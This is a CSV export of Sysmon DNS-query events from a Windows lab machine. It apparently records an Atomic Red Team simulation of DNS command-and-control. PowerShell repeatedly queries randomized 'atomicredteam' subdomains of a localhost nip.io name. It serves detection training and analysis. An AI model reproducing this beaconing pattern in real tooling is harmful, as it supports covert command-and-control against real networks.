"2025-12-22 13:58:39.999 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165924,"Query: atomicredteam-144981.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:39.627","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:39.999 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165925,"Query: atomicredteam-622583.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:39.669","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:40.000 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165926,"Query: atomicredteam-756931.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:39.711","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:40.000 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165927,"Query: atomicredteam-248778.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:39.755","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:41.006 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165928,"Query: atomicredteam-770021.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:39.930","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:41.006 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165929,"Query: atomicredteam-825790.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:40.101","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:41.006 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165930,"Query: atomicredteam-314305.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:40.145","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:41.006 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165931,"Query: atomicredteam-391761.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:40.188","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:41.006 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165932,"Query: atomicredteam-299944.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:40.232","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:41.006 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165933,"Query: atomicredteam-253175.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:40.275","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:41.006 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165934,"Query: atomicredteam-812184.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:40.317","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:41.007 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165935,"Query: atomicredteam-492652.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:40.498","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:41.007 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165936,"Query: atomicredteam-398567.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:40.542","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:41.007 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165937,"Query: atomicredteam-550442.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:40.585","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:41.007 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165938,"Query: atomicredteam-741206.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:40.628","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:41.007 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165939,"Query: atomicredteam-755481.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:40.672","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:41.007 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165940,"Query: atomicredteam-353954.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:40.715","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:41.007 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165941,"Query: atomicredteam-28169.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:40.758","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:41.007 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165942,"Query: atomicredteam-401380.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:40.802","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:41.007 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165943,"Query: atomicredteam-634119.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:40.848","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:42.021 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165944,"Query: atomicredteam-119350.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:41.023","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:42.021 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165945,"Query: atomicredteam-758395.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:41.062","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:42.021 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165946,"Query: atomicredteam-615281.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:41.105","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:42.021 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165947,"Query: atomicredteam-242961.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:41.147","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:42.022 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165948,"Query: atomicredteam-6470.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:41.197","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:42.022 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165949,"Query: atomicredteam-702665.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:41.516","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:42.022 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165950,"Query: atomicredteam-609140.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:41.579","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:42.022 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165951,"Query: atomicredteam-652053.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:41.623","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:42.022 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165952,"Query: atomicredteam-433525.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:41.668","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:42.022 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165953,"Query: atomicredteam-188597.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:41.839","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:42.022 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165954,"Query: atomicredteam-836189.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:41.878","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:42.022 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165955,"Query: atomicredteam-693116.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:41.918","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:42.022 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165956,"Query: atomicredteam-362761.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:41.959","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:42.022 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165957,"Query: atomicredteam-569334.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:42.001","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:43.026 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165958,"Query: atomicredteam-901791.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:42.045","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:43.026 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165959,"Query: atomicredteam-487772.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:42.088","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:43.026 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165960,"Query: atomicredteam-926432.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:42.133","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:43.026 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165961,"Query: atomicredteam-459884.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:42.173","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:43.026 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165962,"Query: atomicredteam-787381.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:42.343","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:43.026 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165963,"Query: atomicredteam-779343.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:42.664","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:43.026 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165964,"Query: atomicredteam-940547.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:42.708","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:43.026 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165965,"Query: atomicredteam-554340.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:42.752","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:43.026 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165966,"Query: atomicredteam-529481.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:42.795","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:43.026 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165967,"Query: atomicredteam-277341.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:42.843","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:43.026 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165968,"Query: atomicredteam-526773.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:42.886","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:43.026 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165969,"Query: atomicredteam-24173.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:42.929","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:43.026 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165970,"Query: atomicredteam-375451.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:42.970","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:43.026 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165971,"Query: atomicredteam-405845.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:43.009","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:44.033 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165972,"Query: atomicredteam-283385.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:43.050","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
